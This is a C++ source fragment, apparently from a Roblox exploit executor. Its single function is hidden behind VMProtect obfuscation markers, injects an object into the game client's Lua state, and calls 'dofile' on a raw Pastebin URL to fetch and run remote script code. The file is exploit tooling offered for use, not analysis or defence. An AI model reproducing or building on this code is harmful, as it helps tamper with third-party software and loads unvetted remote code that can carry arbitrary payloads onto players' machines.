#include "getobjects.h"
#include "execution.h"

#include "interwebs.h"
#include "vmprotectsdk.h"

#include <fstream>

void RBX::GetObjects::loadScripts(std::uintptr_t rL, std::shared_ptr<std::uintptr_t> i)
{
	VMProtectBegin(NULL);

	rbx_bridgepush(rL, i);
	rbx_setfield(rL, -10002, "loadedAsset");

	rbx_getfield(rL, -10002, "dofile");
	Lua::pushstring(rL, "https://pastebin.com/raw/dCHJ7NMu");
	rbx_pcall(rL, 1, 0, 0);

	VMProtectEnd();
}